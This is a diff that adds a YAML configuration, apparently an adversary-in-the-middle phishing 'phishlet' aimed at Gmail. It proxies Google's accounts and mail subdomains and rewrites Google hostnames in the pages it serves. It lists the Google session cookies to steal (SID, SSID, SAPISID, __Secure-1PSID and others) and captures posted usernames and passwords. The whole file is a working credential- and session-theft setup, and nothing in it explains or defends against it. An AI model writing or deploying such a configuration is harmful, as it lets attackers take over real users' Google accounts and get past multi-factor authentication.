@@ -1,0 +1,42 @@
+name: 'gmail'
+author: 'gophish-labs'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false}
+
+sub_filters:
+  - triggers_on: ['accounts.google.com']
+    orig_sub: 'accounts'
+    domain: 'google.com'
+    search: 'accounts.google.com'
+    replace: '{domain}'
+    mimes: ['text/html', 'application/json', 'application/javascript']
+
+  - triggers_on: ['mail.google.com']
+    orig_sub: 'mail'
+    domain: 'google.com'
+    search: 'mail.google.com'
+    replace: '{domain}'
+    mimes: ['text/html', 'application/json']
+
+auth_tokens:
+  - domain: '.google.com'
+    keys: ['SID', 'SSID', 'HSID', 'APISID', 'SAPISID', '__Secure-1PSID', '__Secure-3PSID']
+
+credentials:
+  username:
+    key: 'identifier'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  url: '/signin/v2/identifier'
+
+force_post: []
